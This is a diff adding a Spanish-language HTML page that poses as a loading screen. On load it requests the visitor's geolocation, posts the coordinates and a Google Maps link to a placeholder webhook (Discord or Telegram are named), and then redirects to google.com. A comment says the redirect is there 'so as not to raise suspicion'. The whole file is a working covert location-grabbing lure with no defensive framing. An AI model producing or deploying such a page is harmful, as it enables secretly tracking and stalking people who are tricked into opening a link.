@@ -1,0 +1,37 @@
+Index.html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando contenido...</title>
+</head>
+<body>
+    <h1>Cargando...</h1>
+    <p>Por favor, permite el acceso para continuar.</p>
+    <script>
+        // Función para enviar los datos a tu servidor o bot
+        async function enviarUbicacion(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Aquí enviarías los datos a un Webhook (por ejemplo, de Discord o Telegram)
+            const urlWebhook = "TU_URL_DE_WEBHOOK_AQUI"; 
+            
+            await fetch(urlWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📍 ¡Ubicación recibida! \nLatitud: ${lat} \nLongitud: ${lon} \nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
+                })
+            });
+            // Redirigir a una página real para no levantar sospechas
+            window.location.href = "https://www.google.com";
+        }
+        function error() {
+            alert("Es necesario activar la ubicación para ver este contenido.");
+        }
+        // Solicitar ubicación al cargar la página
+        navigator.geolocation.getCurrentPosition(enviarUbicacion, error);
+    </script>
+</body>
+</html>
